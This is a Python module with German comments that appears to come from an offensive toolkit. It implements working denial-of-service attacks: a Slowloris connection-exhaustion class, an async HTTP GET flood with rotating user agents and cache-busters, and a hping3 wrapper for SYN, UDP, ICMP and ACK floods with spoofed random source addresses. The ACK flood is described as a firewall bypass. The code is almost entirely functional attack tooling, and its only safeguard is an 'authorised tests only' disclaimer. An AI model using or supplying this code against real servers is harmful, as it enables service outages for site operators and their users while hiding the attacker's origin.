"""
DDoS / Stress-Testing Modul.

Tools:
  1. Slowloris  — hält HTTP-Verbindungen offen (pure Python, kein Dep)
                  Ziel: Apache/nginx-Server mit Connection-Limit erschöpfen
  2. hping3     — SYN-Flood, UDP-Flood, ICMP-Flood (kernel-level, sehr schnell)
  3. HTTP Flood — GET/POST-Flood via asyncio (maximiert Requests/sec)

Alle mit Live-Stats: Requests/s, aktive Verbindungen, Ziel-Antwortzeit.

NUR für eigene Server / autorisierte Tests (Load-Tests, Pentests).
"""

from __future__ import annotations
import asyncio
import socket
import ssl
import time
import random
import string
from dataclasses import dataclass
from typing import AsyncGenerator

from core.runner import CommandRunner, check_tool
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="DDoS / Stress-Test",
    description=(
        "Slowloris (pure Python), hping3 SYN/UDP Flood, HTTP Flood. "
        "Live-Stats: Verbindungen/s, aktive Sockets, Ziel-RTT."
    ),
    usage="Ziel-IP/Domain + Port eingeben. Methode wählen. Dauer setzen.",
    danger_note="⛔ BLACK — nur eigene/autorisierte Server.",
    example="Ziel: 192.168.1.1  Port: 80  Methode: slowloris  Dauer: 60s",
)

DANGER = DangerLevel.BLACK

# ── User-Agent Pool für HTTP Flood ────────────────────────────────────────────
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
]


@dataclass
class DDoSStats:
    start_time: float = 0.0
    connections_total: int = 0
    connections_active: int = 0
    connections_failed: int = 0
    bytes_sent: int = 0
    target_responded: bool = False

    def elapsed(self) -> float:
        return time.time() - self.start_time if self.start_time else 0

    def rate(self) -> float:
        e = self.elapsed()
        return self.connections_total / e if e > 0 else 0


# ─────────────────────────────────────────────────────────────────────────────
# SLOWLORIS
# ─────────────────────────────────────────────────────────────────────────────

class Slowloris:
    """
    Slowloris: öffnet viele HTTP-Verbindungen, schickt nur partielle Header.
    Server wartet auf vollständige Anfrage → alle Threads blockiert.
    Funktioniert gegen Apache < 2.4, nginx ohne Tuning, viele Embedded-Server.
    """

    def __init__(
        self,
        host: str,
        port: int = 80,
        sockets: int = 200,
        interval: float = 15.0,
        use_https: bool = False,
        duration: int = 60,
    ):
        self.host     = host
        self.port     = port
        self.sockets  = sockets
        self.interval = interval
        self.use_https = use_https
        self.duration  = duration
        self._stop    = False
        self.stats    = DDoSStats()

    def _make_socket(self) -> socket.socket | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            if self.use_https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=self.host)
            # Partieller HTTP-Header — Server wartet auf \r\n\r\n das nie kommt
            ua = random.choice(_USER_AGENTS)
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send(f"User-Agent: {ua}\r\n".encode())
            s.send(b"Accept-Language: de-DE,de;q=0.9\r\n")
            s.send(b"Accept-Encoding: gzip, deflate\r\n")
            # KEIN \r\n am Ende → Verbindung bleibt offen
            self.stats.connections_total += 1
            self.stats.connections_active += 1
            return s
        except Exception:
            self.stats.connections_failed += 1
            return None

    async def run(self) -> AsyncGenerator[str, None]:
        self.stats.start_time = time.time()
        socks: list[socket.socket] = []

        yield f"[*] Slowloris → {self.host}:{self.port}"
        yield f"[*] Ziel-Sockets: {self.sockets}  |  Keepalive: {self.interval}s  |  Dauer: {self.duration}s"
        yield f"[*] Aufbau initiale Verbindungen..."

        # Initiale Sockets aufbauen
        for _ in range(self.sockets):
            s = self._make_socket()
            if s:
                socks.append(s)
            await asyncio.sleep(0.02)  # sanfter Start

        yield f"[+] {len(socks)} Verbindungen offen"
        yield f"[*] Sende Keepalive-Header alle {self.interval}s...\n"

        end_time = time.time() + self.duration
        tick = 0

        while time.time() < end_time and not self._stop:
            tick += 1
            dead = []

            # Keepalive: partiellen Header senden damit Verbindung nicht timeout
            for s in socks:
                try:
                    header = f"X-a: {random.randint(1,5000)}\r\n".encode()
                    s.send(header)
                    self.stats.bytes_sent += len(header)
                except Exception:
                    dead.append(s)
                    self.stats.connections_active -= 1

            # Tote Verbindungen ersetzen
            for s in dead:
                socks.remove(s)
                try:
                    s.close()
                except Exception:
                    pass

            while len(socks) < self.sockets:
                ns = self._make_socket()
                if ns:
                    socks.append(ns)

            elapsed = self.stats.elapsed()
            remaining = max(0, self.duration - elapsed)
            yield (
                f"  [{elapsed:>5.0f}s]  Aktiv: {len(socks):>4}  |  "
                f"Gesamt: {self.stats.connections_total:>5}  |  "
                f"Fehler: {self.stats.connections_failed:>4}  |  "
                f"Noch: {remaining:.0f}s"
            )

            await asyncio.sleep(self.interval)

        # Aufräumen
        for s in socks:
            try:
                s.close()
            except Exception:
                pass

        yield f"\n[+] Slowloris beendet."
        yield f"[+] Gesamt-Verbindungen : {self.stats.connections_total}"
        yield f"[+] Gesendete Bytes     : {self.stats.bytes_sent:,}"
        yield f"[+] Dauer               : {self.stats.elapsed():.1f}s"

    def stop(self):
        self._stop = True


# ─────────────────────────────────────────────────────────────────────────────
# HTTP FLOOD
# ─────────────────────────────────────────────────────────────────────────────

class HTTPFlood:
    """
    Async HTTP GET/POST Flood — maximiert Requests/sec via asyncio.
    Jeder Request hat zufälligen User-Agent + Cache-Buster Parameter.
    """

    def __init__(
        self,
        url: str,
        method: str = "GET",
        workers: int = 100,
        duration: int = 60,
    ):
        self.url      = url
        self.method   = method.upper()
        self.workers  = workers
        self.duration = duration
        self._stop    = False
        self._req_count = 0
        self._err_count = 0

    async def _flood_worker(self):
        import urllib.request
        end = time.time() + self.duration
        while time.time() < end and not self._stop:
            try:
                ua  = random.choice(_USER_AGENTS)
                cb  = ''.join(random.choices(string.ascii_lowercase, k=8))
                url = f"{self.url}?_{cb}={random.randint(0, 99999)}"
                req = urllib.request.Request(url, headers={"User-Agent": ua})
                urllib.request.urlopen(req, timeout=3)
                self._req_count += 1
            except Exception:
                self._err_count += 1

    async def run(self) -> AsyncGenerator[str, None]:
        yield f"[*] HTTP Flood → {self.url}"
        yield f"[*] Methode: {self.method}  |  Workers: {self.workers}  |  Dauer: {self.duration}s\n"

        tasks = [asyncio.create_task(self._flood_worker()) for _ in range(self.workers)]
        start = time.time()
        last_count = 0

        while time.time() - start < self.duration:
            await asyncio.sleep(5)
            elapsed  = time.time() - start
            interval_reqs = self._req_count - last_count
            last_count    = self._req_count
            rps = interval_reqs / 5
            yield (
                f"  [{elapsed:>5.0f}s]  Requests: {self._req_count:>7,}  |  "
                f"~{rps:>6.0f} req/s  |  Fehler: {self._err_count:>5}"
            )

        self._stop = True
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        total_rps = self._req_count / self.duration
        yield f"\n[+] HTTP Flood beendet."
        yield f"[+] Requests gesamt : {self._req_count:,}"
        yield f"[+] Ø req/s         : {total_rps:.1f}"
        yield f"[+] Fehler          : {self._err_count:,}"


# ─────────────────────────────────────────────────────────────────────────────
# HPING3 WRAPPER
# ─────────────────────────────────────────────────────────────────────────────

class HpingFlood:
    """
    Wrapper für hping3 — SYN-Flood, UDP-Flood, ICMP-Flood.
    hping3 arbeitet auf Rohdaten-Ebene, sehr hoher Durchsatz.
    Benötigt root + apt-get install hping3
    """

    MODES = {
        "syn":  {"flag": "--syn",  "label": "SYN Flood (TCP Halbverbindungen)"},
        "udp":  {"flag": "--udp",  "label": "UDP Flood"},
        "icmp": {"flag": "--icmp", "label": "ICMP Flood (Ping-Flood)"},
        "ack":  {"flag": "--ack",  "label": "ACK Flood (Firewall-Bypass)"},
    }

    def __init__(
        self,
        host: str,
        port: int = 80,
        mode: str = "syn",
        duration: int = 30,
        rate: int = 0,      # 0 = flood (max speed)
        spoof_src: bool = True,
    ):
        self.host      = host
        self.port      = port
        self.mode      = mode
        self.duration  = duration
        self.rate      = rate
        self.spoof_src = spoof_src

    async def run(self) -> AsyncGenerator[str, None]:
        if not await check_tool("hping3"):
            yield "[!] hping3 nicht installiert."
            yield "[*] Installieren: apt-get install hping3 -y"
            return

        mode_info = self.MODES.get(self.mode, self.MODES["syn"])
        yield f"[*] hping3 {mode_info['label']} → {self.host}:{self.port}"

        cmd = ["hping3", self.host,
               mode_info["flag"],
               "-p", str(self.port),
               "--faster" if self.rate == 0 else f"--interval u{1000000 // max(self.rate,1)}",
               "-c", str(self.rate * self.duration if self.rate > 0 else 999999999),
               "--rand-source" if self.spoof_src else "--count", "1",
        ]
        # Sauberer: hping3 mit --count und timeout via asyncio
        cmd = [
            "hping3", self.host,
            mode_info["flag"],
            "-p", str(self.port),
            "--flood" if self.rate == 0 else f"--faster",
        ]
        if self.spoof_src:
            cmd.append("--rand-source")

        yield f"[*] Befehl: {' '.join(cmd)}"
        yield f"[*] Dauer: {self.duration}s  (Ctrl+C zum Stoppen)\n"

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            end_time = asyncio.get_event_loop().time() + self.duration
            while asyncio.get_event_loop().time() < end_time:
                try:
                    line = await asyncio.wait_for(proc.stdout.readline(), timeout=1.0)
                    if line:
                        yield line.decode(errors="replace").strip()
                except asyncio.TimeoutError:
                    remaining = end_time - asyncio.get_event_loop().time()
                    yield f"  [*] Noch {remaining:.0f}s..."

            proc.terminate()
            await proc.wait()
            yield "\n[+] hping3 beendet."

        except Exception as e:
            yield f"[!] Fehler: {e}"
